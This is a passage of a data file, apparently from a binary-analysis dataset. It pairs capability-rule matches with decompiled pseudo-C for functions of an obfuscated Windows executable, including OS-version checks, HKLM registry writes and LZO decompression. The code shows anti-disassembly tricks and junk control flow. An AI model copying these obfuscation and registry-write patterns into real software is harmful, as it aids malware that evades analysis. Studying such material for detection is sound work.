Removing unreachable block (ram,0x0040160c)\n// WARNING: Removing unreachable block (ram,0x0040161b)\n// WARNING: Removing unreachable block (ram,0x00401618)\n// WARNING: Removing unreachable block (ram,0x0040163d)\n// WARNING: Removing unreachable block (ram,0x0040164c)\n// WARNING: Removing unreachable block (ram,0x00401649)\n// WARNING: Removing unreachable block (ram,0x00401650)\n// WARNING: Removing unreachable block (ram,0x00401652)\n// WARNING: Removing unreachable block (ram,0x0040165b)\n// WARNING: Removing unreachable block (ram,0x0040166b)\n// WARNING: Removing unreachable block (ram,0x00401678)\n// WARNING: Removing unreachable block (ram,0x0040168e)\n// WARNING: Removing unreachable block (ram,0x00401694)\n// WARNING: Removing unreachable block (ram,0x004016a0)\n// WARNING: Removing unreachable block (ram,0x0040169c)\n// WARNING: Removing unreachable block (ram,0x004016ab)\n// WARNING: Removing unreachable block (ram,0x004016b7)\n// WARNING: Removing unreachable block (ram,0x004016c8)\n// WARNING: Removing unreachable block (ram,0x004016d1)\n// WARNING: Removing unreachable block (ram,0x004016dd)\n// WARNING: Removing unreachable block (ram,0x00401710)\n// WARNING: Removing unreachable block (ram,0x004016e6)\n// WARNING: Removing unreachable block (ram,0x004016e8)\n// WARNING: Removing unreachable block (ram,0x004016ef)\n// WARNING: Removing unreachable block (ram,0x00401714)\n// WARNING: Removing unreachable block (ram,0x00401768)\n// WARNING: Removing unreachable block (ram,0x00401774)\n// WARNING: Removing unreachable block (ram,0x0040177a)\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nulong __cdecl fcn.004014a0(uint *arg_8h, uint *arg_ch)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uchar var_68h;\n    uint var_67h;\n    uint var_4h;\n    \n    var_4h = 0;\n    var_68h = 0;\n    puVar3 = &var_67h;\n    for (iVar2 = 0x18; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    *puVar3 = 0;\n    *(puVar3 + 2) = 0;\n    fcn.00401540(&var_68h, &var_4h);\n    uVar1 = fcn.00403f50(&var_68h, var_4h, 0x407010, 0xa180);\n    *arg_8h = 0x407010;\n    *arg_ch = 0xa180;\n    return CONCAT44(arg_ch, uVar1);\n}\n",
        "token_count": 1158
    },
    "004017d0": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2",
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2",
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2",
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00401836) overlaps instruction at (ram,0x00401833)\n// \n\nuint __cdecl fcn.004017d0(char *arg_8h, int32_t arg_ch)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    char *unaff_ESI;\n    uint32_t uVar4;\n    uint *puVar5;\n    code *pcVar6;\n    char *pcVar7;\n    uint16_t in_SS;\n    bool bVar8;\n    uchar var_264h;\n    uint var_263h;\n    char var_160h;\n    uint var_15fh;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    int32_t var_48h;\n    int32_t var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    char *var_20h;\n    char *var_1ch;\n    uint *var_18h;\n    uint *var_14h;\n    uint *var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    pcVar6 = _sym.imp.MSVCRT.dll_sprintf;\n    var_264h = 0;\n    puVar5 = &var_263h;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    *puVar5 = 0;\n    *(puVar5 + 2) = 0;\n    var_160h = '\\0';\n    puVar5 = &var_15fh;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    *puVar5 = 0;\n    *(puVar5 + 2) = 0;\n    bVar8 = arg_ch != 0;\n    var_ch = 1;\n    var_4h = 0;\n    var_8h = 1;\n    uVar4 = bVar8;\n    if ((!bVar8) || (bVar8)) {\n        (*_sym.imp.MSVCRT.dll_sprintf)(&var_160h, 0x41120c, arg_8h);\n        unaff_ESI = arg_8h;\n    }\n    else {\n        pcVar6 = in_SS;\n        *(uVar4 + 0x4060f83d) = *(uVar4 + 0x4060f83d);\n        unaff_ESI[-0x73] = unaff_ESI[-0x73] + '\\x01';\n        *0x11 = *0x11 + '\\x01';\n    }\n    (*pcVar6)(&var_264h, 0x411224, unaff_ESI);\n    pcVar6 = _sym.imp.SHLWAPI.dll_SHSetValueA;\n    var_20h = &var_160h;\n    var_18h = &var_ch;\n    var_14h = &var_4h;\n    var_10h = &var_8h;\n    uVar3 = 0xffffffff;\n    pcVar7 = &var_160h;\n    do {\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n        cVar1 = *pcVar7;\n        pcVar7 = pcVar7 + 1;\n    } while (cVar1 != '\\0');\n    var_48h = ~uVar3 - 1;\n    uVar3 = 0xffffffff;\n    pcVar7 = unaff_ESI;\n    do {\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n        cVar1 = *pcVar7;\n        pcVar7 = pcVar7 + 1;\n    } while (cVar1 != '\\0');\n    var_34h = 0x41124c;\n    var_30h = 0x411258;\n    var_2ch = 0x411264;\n    var_28h = 0x411274;\n    var_24h = 0x41127c;\n    var_5ch = 2;\n    var_58h = 1;\n    var_54h = 4;\n    var_50h = 4;\n    var_4ch = 4;\n    var_1ch = unaff_ESI;\n    var_44h = ~uVar3 - 1;\n    var_40h = 4;\n    var_3ch = 4;\n    var_38h = 4;\n    if (uVar4 < 5) {\n        uVar4 = uVar4 * 4;\n        do {\n            iVar2 = (*pcVar6)(0x80000002, &var_264h, *(&var_34h + uVar4), *(&var_5ch + uVar4), *(&var_20h + uVar4), \n                              *(&var_48h + uVar4));\n            if (iVar2 != 0) {\n                return 0;\n            }\n            uVar4 = uVar4 + 4;\n        } while (uVar4 < 0x14);\n    }\n    return 1;\n}\n",
        "token_count": 1268
    },
    "00402c70": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\nint64_t fcn.00402c70(void)\n\n{\n    uint32_t extraout_EDX;\n    uint lpVersionInformation;\n    int32_t var_90h;\n    int32_t var_8ch;\n    \n    lpVersionInformation = 0x94;\n    (*_sym.imp.KERNEL32.dll_GetVersionExA)(&lpVersionInformation);\n    if (var_90h == 5) {\n        return CONCAT44(extraout_EDX, 1);\n    }\n    if ((var_90h == 6) && (var_8ch == 0)) {\n        return CONCAT44(extraout_EDX, 1);\n    }\n    return extraout_EDX << 0x20;\n}\n",
        "token_count": 152
    },
    "00402fa0": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00403023) overlaps instruction at (ram,0x0040301e)\n// \n\nbool __cdecl fcn.00402fa0(uint *arg_8h)\n\n{\n    char *pcVar1;\n    uint uVar2;\n    int32_t iVar3;\n    code *pcVar4;\n    int32_t extraout_ECX;\n    int32_t iVar5;\n    uint8_t uVar6;\n    uint32_t uVar7;\n    uint32_t uVar8;\n    int32_t *piVar9;\n    bool bVar10;\n    int32_t var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    (*_sym.imp.MSVCRT.dll__strlwr)(arg_8h);\n    var_14h = 0x4115c0;\n    var_10h = 0x4115b8;\n    var_ch = 0x4115c8;\n    var_8h = 0x4115d0;\n    var_4h = 0x4115d8;\n    uVar7 = 0;\n    piVar9 = &var_14h;\n    do {\n        iVar3 = (*_sym.imp.MSVCRT.dll_strstr)(arg_8h, *piVar9);\n        bVar10 = iVar3 == 0;\n        iVar5 = extraout_ECX;\n        uVar8 = uVar7;\n        while( true ) {\n            if (!bVar10) {\n                return true;\n            }\n            uVar7 = uVar8 + 1;\n            piVar9 = piVar9 + 1;\n            bVar10 = uVar7 < 5;\n            if (bVar10) break;\n            if ((bVar10) || (!bVar10)) {\n                pcVar4 = (*_sym.imp.MSVCRT.dll_strstr)(arg_8h, 0x4115b0);\ncode_r0x00403059:\n                return pcVar4 == NULL;\n            }\n            iVar5 = iVar5 + -1;\n            if (iVar5 == 0 || uVar7 != 5) {\n                uVar2 = *arg_8h;\n                *piVar9 = arg_8h + 1;\n                uVar6 = uVar2 >> 0x1f;\n                bVar10 = CARRY1(*0x68b8ec43, uVar6);\n                *0x68b8ec43 = *0x68b8ec43 + uVar6;\n                pcVar4 = sym.imp.MSVCRT.dll_strstr + bVar10 + CONCAT31(*0x9750e2b5 >> 8, 0x15);\n                goto code_r0x00403059;\n            }\n            pcVar1 = uVar8 + 0xc08508c5;\n            *pcVar1 = *pcVar1 + iVar3;\n            bVar10 = *pcVar1 == '\\0';\n            uVar8 = uVar7;\n        }\n    } while( true );\n}\n",
        "token_count": 682
    },
    "00403980": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\nuint32_t fcn.00403980(void)\n\n{\n    int32_t iVar1;\n    uint uStack12;\n    uint32_t uStack8;\n    uchar auStack4 [4];\n    \n    uStack12 = 4;\n    iVar1 = fcn.00402300(0x80000002, 0x411358, 0x4113a4, auStack4, &uStack8, &uStack12);\n    if ((iVar1 == 0) || (5 < uStack8)) {\n        uStack8 = 0xffffffff;\n    }\n    return uStack8;\n}\n",
        "token_count": 132
    },
    "004041f0": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00404a68) overlaps instruction at (ram,0x00404a67)\n// \n// WARNING: Removing unreachable block (ram,0x00404a68)\n\nuint fcn.004041f0(void)\n\n{\n    char *pcVar1;\n    uint32_t uVar2;\n    uint16_t uVar3;\n    int32_t iVar4;\n    uint *puVar5;\n    uint uVar6;\n    uint32_t uVar7;\n    uchar *puVar8;\n    char extraout_CH;\n    uint16_t extraout_CX;\n    uint32_t extraout_ECX;\n    uint32_t uVar9;\n    int32_t *extraout_ECX_00;\n    uint32_t extraout_ECX_01;\n    uchar *extraout_ECX_02;\n    char extraout_CH_00;\n    uint8_t extraout_CH_01;\n    uint32_t extraout_ECX_03;\n    char extraout_CH_02;\n    uint extraout_ECX_04;\n    ushort extraout_DX;\n    int32_t *piVar10;\n    int32_t extraout_EDX;\n    uint32_t extraout_EDX_00;\n    int32_t extraout_EDX_01;\n    int32_t extraout_EDX_02;\n    int32_t extraout_EDX_03;\n    uint32_t extraout_EDX_04;\n    uint8_t *unaff_EBX;\n    uint *unaff_EBP;\n    uint *puVar11;\n    uint *unaff_EDI;\n    uint *puVar12;\n    uchar uVar13;\n    bool bVar14;\n    bool bVar15;\n    char cVar16;\n    uchar uVar17;\n    uint8_t in_IF;\n    bool bVar18;\n    char cVar19;\n    bool bVar20;\n    unkbyte10 extraout_ST0;\n    ulong uVar21;\n    unkbyte6 Var22;\n    uchar in_stack_ffffffb8;\n    ushort in_stack_ffffffb9;\n    uchar in_stack_ffffffbb;\n    uchar uVar23;\n    uchar uVar24;\n    ushort uVar25;\n    ushort uVar26;\n    ushort uVar27;\n    uchar uVar28;\n    uchar uVar29;\n    uchar uVar30;\n    ushort uVar31;\n    uchar uVar32;\n    char cVar33;\n    uchar uVar34;\n    uint8_t uVar35;\n    \n    bVar18 = false;\n    bVar15 = true;\n    uVar13 = 0x2c;\n    uVar27 = 0x4042;\n    uVar24 = 0;\n    iVar4 = fcn.004038e0(0x423614, 0xd, 0x4111a4, 10);\n    if ((bVar15) || (!bVar15)) {\n        uVar13 = 0x12;\n        uVar27 = 0;\n        uVar24 = 0;\n    }\n    puVar5 = iVar4 + -0x1bf31dd6;\n    *unaff_EBX = *unaff_EBX & 0xc3;\n    uVar21 = fcn.004038e0(0x423614, 0xd, 0x4111b0, CONCAT13(uVar24, CONCAT21(uVar27, uVar13)));\n    piVar10 = uVar21 >> 0x20;\n    *(uVar21 + -0x7ce92414) = extraout_ST0;\n    cVar33 = unaff_EBX;\n    uVar17 = unaff_EBX >> 0x18;\n    *piVar10 = *piVar10 + 0x46adf84;\n    uVar29 = 0xc4;\n    uVar26 = 0x4111;\n    uVar30 = 0;\n    uVar13 = 0xd;\n    uVar27 = 0;\n    uVar24 = 0;\n    fcn.004038e0(0x423614, 0xd, 0x4111c4, unaff_EBX);\n    fcn.004038e0(0x423614, 0xd, 0x4111c8, 0xc);\n    fcn.004038e0(0x423614, 0xd, 0x4111d4, 7);\n    uVar32 = SUB41(unaff_EBP, 0);\n    uVar31 = unaff_EBP >> 8;\n    uVar23 = unaff_EBP >> 0x18;\n    uVar9 = extraout_ECX & 0xffff0000 | CONCAT11((extraout_ECX >> 8) - cVar33, extraout_ECX);\n    cVar19 = SBORROW4(uVar9, extraout_EDX);\n    cVar16 = uVar9 - extraout_EDX < 0;\n    fcn.004038e0(0x423614, 0xd, 0x4111dc, 0xb);\n    if (cVar19 == cVar16) {\n        uVar28 = unaff_EBX >> 8;\n        uVar34 = unaff_EBX >> 0x10;\n        if (cVar19 == cVar16) goto code_r0x0040430f;\n        *extraout_ECX_00 = *extraout_ECX_00 + extraout_EDX_00 + (extraout_EDX_00 < 0xe8680c6a);\n    }\n    else {\ncode_r0x0040430f:\n        cVar33 = '\\f';\n        uVar28 = 0;\n        uVar34 = 0;\n        uVar17 = 0;\n        uVar32 = 0xe8;\n        uVar31 = 0x4111;\n        uVar23 = 0;\n    }\n    fcn.004038e0(0x423614, 0xd, CONCAT13(uVar23, CONCAT21(uVar31, uVar32)), \n                 CONCAT13(uVar17, CONCAT12(uVar34, CONCAT11(uVar28, cVar33))));\n    uVar9 = (unaff_EBX >> 8 & 0xffff00) << 8;\n    fcn.004038e0(0x423614, 0xd, 0x4111f4, 8);\n    fcn.004038e0(0x423614, 0xd, 0x4111fc, 0xd);\n    fcn.004038e0(0x423614, 0xd, 0x41120c, 0x18);\n    fcn.004038e0(0x423614, 0xd, 0x411224, 0x25);\n    bVar15 = false;\n    uVar17 = 0xb;\n    uVar32 = 0x44;\n    uVar23 = 0x40;\n    uVar28 = 0;\n    fcn.004038e0(0x423614, 0xd, 0x41124c, 10);\n    if ((bVar15) || (!bVar15)) {\n        uVar17 = 0xc;\n        uVar32 = 0;\n        uVar23 = 0;\n        uVar28 = 0;\n    }\n    bVar15 = false;\n    fcn.004038e0(0x423614, 0xd, 0x411258, CONCAT13(uVar28, CONCAT12(uVar23, CONCAT11(uVar32, uVar17))));\n    if (bVar15) {\ncode_r0x0040444e:\n        uVar17 = 0xd;\n        uVar31 = 0;\n        uVar32 = 0;\n        uVar29 = 100;\n        uVar26 = 0x4112;\n        uVar30 = 0;\n        uVar13 = 0xd;\n        uVar27 = 0;\n        uVar24 = 0;\n    }\n    else {\n        uVar17 = extraout_EDX_01;\n        uVar31 = extraout_EDX_01 >> 8;\n        uVar32 = extraout_EDX_01 >> 0x18;\n        if (!bVar15) goto code_r0x0040444e;\n    }\n    *(iVar4 + 0x27de5964) = *(iVar4 + 0x27de5964) ^ 0x6a27e95e;\n    pcVar1 = extraout_EDX_01 + 0xd;\n    *pcVar1 = *pcVar1 + extraout_CH;\n    bVar15 = *pcVar1 < '\\0';\n    uVar23 = 0x61;\n    uVar25 = 0x4044;\n    uVar28 = 0;\n    fcn.004038e0(0x423614, CONCAT13(uVar24, CONCAT21(uVar27, uVar13)), CONCAT13(uVar30, CONCAT21(uVar26, uVar29)), \n                 CONCAT13(uVar32, CONCAT21(uVar31, uVar17)));\n    if ((bVar15) || (!bVar15)) {\n        uVar23 = 6;\n        uVar25 = 0;\n        uVar28 = 0;\n        in_stack_ffffffb8 = 0x74;\n        in_stack_ffffffb9 = 0x4112;\n        in_stack_ffffffbb = 0;\n    }\n    fcn.004038e0(0x423614, 0xd, CONCAT13(in_stack_ffffffbb, CONCAT21(in_stack_ffffffb9, in_stack_ffffffb8)), \n                 CONCAT13(uVar28, CONCAT21(uVar25, uVar23)));\n    bVar15 = (POPCOUNT(&stack0xfffffff0 & 0xff) & 1U) == 0;\n    if ((!bVar15) && (bVar15)) {\n        puVar5 = &stack0xffffffec;\n        cVar16 = '\\x1e';\n        do {\n            unaff_EBP = unaff_EBP + -1;\n            puVar5 = puVar5 + -1;\n            *puVar5 = *unaff_EBP;\n            cVar16 = cVar16 + -1;\n        } while ('\\0' < cVar16);\n        uVar6 = in(0x78);\n        return uVar6;\n    }\n    fcn.004038e0(0x423614, 0xd, 0x41127c, 5);\n    if ((!bVar15) && (bVar15)) {\n        puVar5 = &stack0xffffffdc;\n        cVar16 = '\\x1e';\n        do {\n            unaff_EBP = unaff_EBP + -1;\n            puVar5 = puVar5 + -1;\n            *puVar5 = *unaff_EBP;\n            cVar16 = cVar16 + -1;\n        } while ('\\0' < cVar16);\n        uVar6 = in(0x78);\n        return uVar6;\n    }\n    fcn.004038e0(0x423614, 0xd, 0x411284, 0xd);\n    fcn.004038e0(0x423614, 0xd, 0x411294, 0x19);\n    fcn.004038e0(0x423614, 0xd, 0x4112b0, 0xf);\n    fcn.004038e0(0x423614, 0xd, 0x4112c0, 0xe);\n    fcn.004038e0(0x423614, 0xd, 0x4112d0, 0xb);\n    uVar2 = uVar9 & 0xff000000;\n    uVar9 = CONCAT12(uVar9 >> 0x10, unaff_EBX);\n    fcn.004038e0(0x423614, 0xd, 0x4112dc, 0xb);\n    fcn.004038e0(0x423614, 0xd, 0x4112e8, 0xb);\n    uVar17 = (puVar5 & extraout_CX) < 0;\n    fcn.004038e0(0x423614, 0xd, 0x4112f4, 10);\n    uVar34 = 0xc;\n    uVar25 = 0x4113;\n    uVar28 = 0;\n    uVar32 = 0x2e;\n    uVar31 = 0x4046;\n    uVar23 = 0;\n    fcn.004038e0(0x423614, 0xd, 0x411300, 0xc);\n    uVar7 = extraout_ECX_01;\n    if ((uVar17) || (uVar7 = extraout_ECX_01 & 0xffff,  !uVar17)) {\n        uVar32 = 0xe;\n        uVar31 = 0;\n        uVar23 = 0;\n        uVar29 = 0xc;\n        uVar26 = 0x4113;\n        uVar30 = 0;\n        uVar13 = 0xd;\n        uVar27 = 0;\n        uVar24 = 0;\n    }\n    *(extraout_EDX_02 + 0xd) = *(extraout_EDX_02 + 0xd) + (uVar7 + 1 >> 8);\n    fcn.004038e0(0x423614, CONCAT13(uVar24, CONCAT21(uVar27, uVar13)), CONCAT13(uVar30, CONCAT21(uVar26, uVar29)), \n                 CONCAT13(uVar23, CONCAT21(uVar31, uVar32)));\n    fcn.004038e0(0x423614, 0xd, 0x41131c, 0x11);\n    uVar7 = fcn.004038e0(0x423614, 0xd, 0x411330, 0x13);\n    bVar15 = uVar7 < 0x6e32;\n    bVar20 = SBORROW4(uVar7, 0x6e32);\n    bVar14 = uVar7 == 0x6e32;\n    uVar7 = uVar2 | uVar9 & 0xffff0000 | unaff_EBX & 0xff | (uVar9 >> 8) << 8;\n    Var22 = fcn.004038e0(0x423614, 0xd, 0x411344, 0x14);\n    if ((bVar20) || (!bVar20)) {\n        uVar35 = 0x33;\n        uVar25 = 0x1358;\n        uVar28 = 0x41;\n        uVar34 = 0;\n        puVar12 = unaff_EDI;\ncode_r0x004046fc:\n        fcn.004038e0(0x423614, 0xd, CONCAT13(uVar34, CONCAT12(uVar28, uVar25)), uVar35);\n        bVar15 = 0xffffffdf < &stack0xffffffd1;\n        bVar14 = *0x10 == 0xf;\n        uVar27 = 0x3614;\n        uVar13 = 0x42;\n        uVar24 = 0;\n        fcn.004038e0(0x423614, 0xd, 0x41138c, 10);\n        if ((!bVar15 && !bVar14) && (bVar15 || bVar14)) {\n            puVar5 = CONCAT13(uVar24, CONCAT12(uVar13, uVar27));\n        }\n    }\n    else {\n        puVar12 = unaff_EDI + 1;\n        uVar13 = in(Var22 >> 0x20);\n        *unaff_EDI = uVar13;\n        uVar7 = CONCAT31(uVar7 >> 8, 0xbc);\n        if (bVar15 || bVar14) {\n            uVar35 = 0x56;\n            uVar7 = uVar2 | uVar9 & 0xffff0000 | CONCAT11(*extraout_ECX_02, 0xbc);\n            goto code_r0x004046fc;\n        }\n        *Var22 = *Var22 + Var22;\n    }\n    uVar3 = fcn.004038e0(0x423614, 0xd, 0x411398, 4);\n    bVar15 = (uVar3 & 0x11cb) == 0;\n    fcn.004038e0(0x423614, 0xd, 0x41139c, 5);\n    if ((!bVar15) && (bVar15)) {\n        bVar18 = ((in_IF & 1) * '\\x02' & 4) != 0;\n    }\n    fcn.004038e0(0x423614, 0xd, 0x4113a4, 6);\n    uVar13 = extraout_CH_00 - 1U < 5;\n    bVar15 = extraout_CH_00 - 1U == 5;\n    fcn.004038e0(0x423614, 0xd, 0x4113d8, 0x2a);\n    if (!bVar15) {\n        uVar24 = SUB41(puVar12, 0);\n        uVar27 = puVar12 >> 8;\n        uVar29 = puVar12 >> 0x18;\n        if (bVar15) {\n            uVar6 = in(extraout_EDX_03);\n            *puVar12 = uVar6;\n            puVar8 = &stack0xffffffe3;\n            iVar4 = extraout_EDX_03;\n            if (0 < &stack0xffffffe4) goto code_r0x004047eb;\n            while( true ) {\n                if (uVar13 || puVar8 == NULL) {\n    // WARNING: Bad instruction - Truncating control flow here\n                    halt_baddata();\n                }\n                bVar15 = (uVar7 & 0xff00 | uVar7 - 0x12) < iVar4;\n                uVar27 = uVar7 >> 0x10;\n                uVar21 = fcn.004038e0(0x423614, 0xd, 0x411190, 0x11);\n                iVar4 = uVar21 >> 0x20;\n                if ((bVar15) || (!bVar15)) break;\n                uVar13 = &stack0xffffffc7 < *uVar21;\n                puVar8 = uVar21 + 1;\n            }\n            cVar16 = fcn.004038e0(0x423614, 0xd, 0x4113ac, 0xf);\n            uVar3 = (extraout_ECX_03 ^ 0x6dd) + 1;\n            bVar15 = (extraout_ECX_03 & 0xffff0000 | uVar3 & 0xff | (uVar3 >> 8) + cVar16 << 8) == extraout_EDX_04;\n            fcn.004038e0(0x423614, 0xd, 0x4113bc, 0x1a);\n            puVar11 = puVar5;\n            if ((!bVar15) && (bVar15)) {\n                puVar11 = puVar5 + bVar18 * -2 + 1;\n                out(*puVar5, extraout_DX);\n            }\n            uVar29 = 0x10;\n            uVar30 = 0x14;\n            uVar31 = 0x41;\n            uVar13 = 0xd;\n            uVar24 = 0;\n            uVar26 = 0;\n            fcn.004038e0(0x423614, 0xd, 0x411410, 10);\n            cVar19 = '\\x01';\n            cVar16 = '\\x01';\n            iVar4 = fcn.004038e0(0x423614, 0xd, 0x41141c, 0xb);\n            if (cVar19 == cVar16) {\n                uVar17 = uVar7 & 0xffff;\n                uVar32 = (uVar7 & 0xffff) >> 8;\n                if (cVar19 == cVar16) goto code_r0x0040491c;\n            }\n            else {\ncode_r0x0040491c:\n                uVar17 = 8;\n                uVar32 = 0;\n                uVar27 = 0;\n                uVar29 = 0x28;\n                uVar30 = 0x14;\n                uVar31 = 0x41;\n                uVar13 = 0xd;\n                uVar24 = 0;\n                uVar26 = 0;\n            }\n            *(iVar4 + 0xd) = *(iVar4 + 0xd) + extraout_CH_02;\n            fcn.004038e0(0x423614, CONCAT22(uVar26, CONCAT11(uVar24, uVar13)), \n                         CONCAT22(uVar31, CONCAT11(uVar30, uVar29)), CONCAT22(uVar27, CONCAT11(uVar32, uVar17)));\n            fcn.004038e0(0x423614, 0xd, 0x411430, 9);\n            fcn.004038e0(0x423614, 0xd, 0x41143c, 9);\n            uVar29 = 0x48;\n            uVar30 = 0x14;\n            uVar26 = 0x41;\n            uVar13 = 0xd;\n            uVar24 = 0;\n            uVar27 = 0;\n            fcn.004038e0(0x423614, 0xd, 0x411448, 9);\n            bVar15 = false;\n            fcn.004038e0(0x423614, 0xd, 0x411454, 0xc);\n            cVar16 = extraout_ECX_04 >> 8;\n            if (!bVar15) {\n                uVar17 = extraout_ECX_04;\n                uVar31 = extraout_ECX_04 >> 0x10;\n                cVar19 = cVar16;\n                if (bVar15) goto code_r0x004049e4;\n            }\n            uVar17 = 3;\n            cVar19 = '\\0';\n            uVar31 = 0;\n            uVar29 = 0x60;\n            uVar30 = 0x14;\n            uVar26 = 0x41;\n            uVar13 = 0xd;\n            uVar24 = 0;\n            uVar27 = 0;\ncode_r0x004049e4:\n            puVar12[bVar18 * -2 + 1] = *puVar11;\n            *0x60680377 = *0x60680377 + cVar16;\n            fcn.004038e0(0x423614, CONCAT22(uVar27, CONCAT11(uVar24, uVar13)), \n                         CONCAT22(uVar26, CONCAT11(uVar30, uVar29)), CONCAT22(uVar31, CONCAT11(cVar19, uVar17)));\n            fcn.004038e0(0x423614, 0xd, 0x411464, 10);\n            cVar19 = '\\0';\n            cVar16 = '\\0';\n            uVar6 = fcn.004038e0(0x423614, 0xd, 0x411470, 0x40);\n            if ((cVar19 == cVar16) && (cVar19 != cVar16)) {\n                out(0xc4, uVar6);\n                (puVar12 + bVar18 * -2 + 1)[bVar18 * -2 + 1] = uVar6;\n            }\n            fcn.004038e0(0x423614, 0xd, 0x4114b0, 0xc);\n            fcn.004038e0(0x423614, 0xd, 0x4114bc, 0xb);\n            fcn.004038e0(0x423614, 0xd, 0x4114c8, 4);\n            fcn.004038e0(0x423614, 0xd, 0x4114cc, 4);\n            fcn.004038e0(0x423614, 0xd, 0x4114d0, 0xc);\n            fcn.004038e0(0x423614, 0xd, 0x4114dc, 4);\n            fcn.004038e0(0x423614, 0xd, 0x4114e0, 9);\n            fcn.004038e0(0x423614, 0xd, 0x4114ec, 0x16);\n            uVar6 = fcn.004038e0(0x423614, 0xd, 0x411504, 7);\n            return uVar6;\n        }\n    }\n    uVar24 = 0xb;\n    uVar27 = 0;\n    uVar29 = 0;\ncode_r0x004047eb:\n    *(extraout_EDX_03 + 0xb) = *(extraout_EDX_03 + 0xb) ^ extraout_CH_01;\n    uVar6 = fcn.004038e0(0x423614, 0xd, 0x411404, CONCAT13(uVar29, CONCAT21(uVar27, uVar24)));\n    return uVar6;\n}\n",
        "token_count": 5660
    },
    "00401b90": {
        "rules": [
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf",
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00401cc3) overlaps instruction at (ram,0x00401cbf)\n// \n// WARNING: Control flow encountered bad instruction data\n// WARNING: Unable to track spacebase fully for stack\n// WARNING: Removing unreachable block (ram,0x00401d28)\n// WARNING: Variable defined which should be unmapped: var_8h\n// WARNING: Removing unreachable block (ram,0x00401c04)\n// WARNING: Removing unreachable block (ram,0x00401c0c)\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint32_t * __cdecl fcn.00401b90(int32_t *arg_8h)\n\n{\n    char *pcVar1;\n    uchar *puVar2;\n    uint32_t **ppuVar3;\n    code *pcVar4;\n    uint8_t uVar5;\n    uint8_t *puVar6;\n    uint32_t *puVar7;\n    int32_t *piVar8;\n    int32_t iVar9;\n    int32_t *piVar10;\n    uint in_ECX;\n    uint32_t uVar11;\n    uint unaff_EBX;\n    uchar *puVar12;\n    uint32_t unaff_ESI;\n    uint32_t uVar13;\n    uint32_t unaff_EDI;\n    ushort in_SS;\n    bool bVar14;\n    uint8_t in_AF;\n    unkbyte10 extraout_ST0;\n    ulong uVar15;\n    uint var_10ch;\n    uint var_8h;\n    uint var_4h;\n    \n    bVar14 = (POPCOUNT(*arg_8h + 0xa5b3 & 0xff) & 1U) == 0;\n    if (*arg_8h + 0xa5b3 != 0) {\n        return NULL;\n    }\n    if ((!bVar14) && (bVar14)) {\n        ppuVar3 = segment(in_SS, *0x10 + -0x14);\n        puVar7 = *ppuVar3;\n        puVar12 = &stack0xffffffec & 0xffff0000 | *0x10 - 0x10;\n        if (*arg_8h < 0x5a4d) {\n            pcVar1 = arg_8h * 2 + 0x33;\n            *pcVar1 = *pcVar1 + -0x62;\n            *(unaff_EDI + 0x5e) = *(unaff_EDI + 0x5e);\n            return puVar7;\n        }\n        if (bVar14) {\n            *arg_8h = *arg_8h + (*arg_8h < 0x5a4d);\n            *puVar7 = *puVar7 + puVar7;\n            puVar2 = *puVar7;\n            puVar6 = puVar7 + 1;\n            *(puVar12 + -4) = 0xb7f8c08b;\n            if (puVar12 < puVar2 || puVar6 == NULL) {\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            }\n            bVar14 = CARRY1(*puVar6, puVar6);\n            *puVar6 = *puVar6 + puVar6;\n            uVar5 = *puVar6;\n            if ((!bVar14 && uVar5 != 0) && (*(puVar12 + -8) = unaff_ESI,  bVar14 || uVar5 == 0)) {\n                do {\n    // WARNING: Do nothing block with infinite loop\n                } while( true );\n            }\n            *(puVar12 + -8) = unaff_EBX;\n            *(puVar12 + -0xc) = in_ECX;\n            *(puVar12 + -0x10) = &fcn.00401b90::var_10ch;\n            *(puVar12 + -0x14) = 0x401b3f;\n            iVar9 = fcn.00404fd0(*(puVar12 + -0x10), *(puVar12 + -0xc), *(puVar12 + -8));\n            if (iVar9 == 0) {\n                return NULL;\n            }\n            *(puVar12 + -2) = unaff_EDI;\n            *(puVar12 + -4) = 0xffffffff;\n            *(puVar12 + -8) = &fcn.00401b90::var_10ch;\n            *(puVar12 + -0xc) = 0x401b80;\n            fcn.00401130();\n            return 0x1;\n        }\n        unaff_EDI = 0xb7bc9ea5;\n    }\n    bVar14 = CARRY4(arg_8h[0xf], arg_8h);\n    piVar8 = arg_8h[0xf] + arg_8h;\n    if 